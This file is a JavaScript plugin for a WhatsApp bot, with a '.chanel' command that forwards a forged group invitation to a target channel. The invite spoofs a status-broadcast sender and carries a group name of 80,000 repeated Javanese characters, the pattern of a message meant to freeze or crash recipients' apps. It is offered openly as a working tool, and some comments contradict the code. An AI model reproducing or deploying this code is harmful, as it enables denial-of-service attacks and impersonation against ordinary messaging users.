let handler = async (m, { conn, text }) => {
    if (!text || !text.includes('whatsapp.com/channel/')) {
        return conn.reply(m.chat, '🫠 Usa el formato correcto:\n.chanel https://whatsapp.com/channel/xxxx', m);
    }

    const canalIdMatch = text.match(/channel\/([0-9A-Za-z]+)/);
    if (!canalIdMatch) return conn.reply(m.chat, '😡 Enlace de canal inválido.', m);

    const fakeInviteCode = 'PAZIN123abc';
    const groupIdFake = '120363999999999999@g.us'; // grupo simulado

    // Nombre fijo repetido 7 veces
    const groupName = 'ꦾ'.repeat(80000).trim();
    const caption = '༺⃢🔥𝑇𝑂𝐵𝐼🔥⃢༻ ²⁰²⁴';

    const fakeInviteMessage = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
        },
        message: {
            groupInviteMessage: {
                groupJid: groupIdFake,
                inviteCode: fakeInviteCode,
                groupName,
                caption,
                jpegThumbnail: null
            }
        }
    };

    const canalJid = `120363${canalIdMatch[1]}@newsletter`;

    // Enviar 5 veces al canal (opcional)
    for (let i = 0; i < 1; i++) {
        await conn.sendMessage(canalJid, {
            forward: fakeInviteMessage
        });
    }

    await conn.sendMessage(m.chat, {
        text: '😼 Invitación falsa enviada al canal.'
    }, { quoted: m });
};

handler.help = ['chanel <enlace_del_canal>'];
handler.tags = ['fake', 'canal'];
handler.command = /^chanel$/i;
export default handler;